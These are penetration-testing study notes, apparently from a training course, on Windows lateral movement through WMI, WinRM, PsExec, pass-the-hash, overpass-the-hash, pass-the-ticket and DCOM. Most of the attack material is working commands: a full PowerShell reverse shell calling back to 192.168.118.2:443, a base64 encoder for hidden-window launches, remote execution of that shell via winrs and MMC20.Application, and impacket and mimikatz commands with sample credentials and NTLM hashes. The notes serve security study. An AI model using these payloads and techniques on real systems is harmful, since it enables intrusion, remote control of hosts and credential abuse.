# WMI and WinRM
## WMI
WMI is capable of creating processes via the Create method from the Win32_Process class. it communicates through RPC over port 135 for remote access and uses a higher-range port (19152-65535) for session data.
To create a process on the remote target via WMI, we need creds of a member of Administrators local group, which can also be a domain user. 
UAC remote restrictions does not apply to domain users, so we can use full privileges while moving laterally.
```
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```

WMI job returned the PID of the newly created process and a return value of 0 meaning that process has been created successfully.
>System processes and services always run in session 0 as part of session isolation, which was introduced in Windows Vista. Because the WMI Provider Host is running as a system service, newly created processes through WMI are also spawned in session 0.

For powershell, we have to create PSCredential object that will store our session username and password. Store the username and password in variables and then secure the password via the `ConvertTo-SecureString` cmdlet.
```powershell
$username = 'jeff';
$password = 'HenchmanPutridBonbon11';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```
Next, create a Common Information Model (CIM) via the `New-CimSession` cmdlet. Specify DCOM as the protocol for the WMI session with the `New-CimSessionOption` cmdlet. Then, create a new session against our target IP and supply PSCredential object along with the session options. Lastly, we'll define 'calc' as the payload to be executed by WMI.
```powershell
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.238.72 -Credential $credential -SessionOption $Options 
$command = 'cmd.exe';
```
Tie together all the arguments by issuing the `Invoke-CimMethod` cmdlet and supply Win32_Process and Create as ClassName and MethodName.
```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```
Replace the prevs payload with a full reverse shell in PowerShell.
Encode it in base64 with python:
```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```
## WinRM
WinRM is the Microsoft version of the WS-Management protocol and it exchanges XML messages over HTTP and HTTPS. It uses TCP port 5986 for encrypted HTTPS traffic and port 5985 for plain HTTP.

WinRM is implemented in numerous built-in utilities, such as `winrs`.
```
winrs -r:web04 -u:jeff -p:HenchmanPutridBonbon11  "cmd /c hostname & whoami"
```
>For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.

Replace the prevs commands with the base64 encoded reverse-shell:
```
winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```
Using PowerShell for WinRM via `New-PSSession` cmdlet by providing the IP of the target host along with the credentials in a credential object format similar to what we did previously.
```powershell
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          192.168.50.73   RemoteMachine   Opened        Microsoft.PowerShell     Available
```
To interact with the session ID 1 we created, we can issue the `Enter-PSSession` cmdlet followed by the session ID.
```powershell
PS C:\Users\jeff> Enter-PSSession 1
[192.168.50.73]: PS C:\Users\jen\Documents> whoami
corp\jen

[192.168.50.73]: PS C:\Users\jen\Documents> hostname
FILES04
```
# PsExec
PsExec - replace telnet-like applications and provide remote execution of processes on other systems through an interactive console.
Requirements to use PsExec:
- The user that authenticates to the target machine needs to be part of the Administrator local group.
- ADMIN$ share must be available and File and Printer Sharing has to be turned on.
In order to execute the command remotely, PsExec performs the following tasks:
- Writes psexesvc.exe into the C:\Windows directory
- Creates and spawns a service on the remote host
- Runs the requested program/command as a child process of psexesvc.exe
Arguments:
- -i - start an interactive session on the remote host
- -u username in format domain\user
- -p password
```
./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```
# Pass the Hash
Pass the Hash - technique that allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password.
This will not work against servers with Kerberos Authentication only.
Toolkits:
- PsExec from Metasploit
- Passing-the-hash toolkit
- Impacket
Attacker connects to the victim using the Server Message Block (SMB) protocol and performs authentication using the NTLM hash.
Most tools will abuse PtH to start a Windows service and communicate with it using Named Pipes. This is done using the Service Control Manager API.
Requires:
- SMB connection through the firewall (port 445)
- Windows File and Printer Sharing feature to be enabled
- ADMIN$ share must be available
- Attacker must present valid creds with local admin permissions.
Using wmiexec from Impacket:
```bash
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```
# Overpass the Hash
With overpass the hash we can 'over' abuse an NTLM user hash to gaint a full Kerberos TGT, and then we can get TGS.
To do overpass the hash - sekurlsa::pth from mimikatz.
Example:
```
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell 
```
>At this point, running the _whoami_ command on the newly created PowerShell session would show _jeff_'s identity instead of _jen_. While this could be confusing, this is the intended behavior of the _whoami_ utility which only checks the current process's token and it does not inspect any imported kerberos tickets

After we converted NTLM to Kerberos ticket, we can use Psexec without creds.
# Pass the Ticket
Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. 
If the service tickets belong to the current user, then no admin privs are required.
To export tickets to .kirbi files:
```
sekurlsa::tickets /export
```
To re-inject the ticket:
```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```
# DCOM
DCOM - Distributed Component Object Model
COM - a system for creating software components that interact with each other. While COM was created for either same-process or cross-process interaction, it was extended to _Distributed Component Object Model_ (DCOM) for interaction between multiple computers over a network.
Interacting with DCOM is performed over RPC on TCP port 135 and local admin access is required to call the DCOM service control manager, which is an API.
DCOM lateral movement technique is based on the MMC COM application that is employed for scripted automation of Windows systems.
MMC Application class allows the creation of Application Objects which expose the ExecuteShellCommand method under the Document.ActiveView property.
With powershell prompt, we can instantiate a remote MMC 2.0 application by specifying the target IP as the second argument of the GetTypeFromProgID method.
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
```
Then we can use ExecuteShellCommand which requires 4 arguments:
- Command
- Directory
- Parameters
- WindowState
Extend the attack with a full reverse shell:
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```
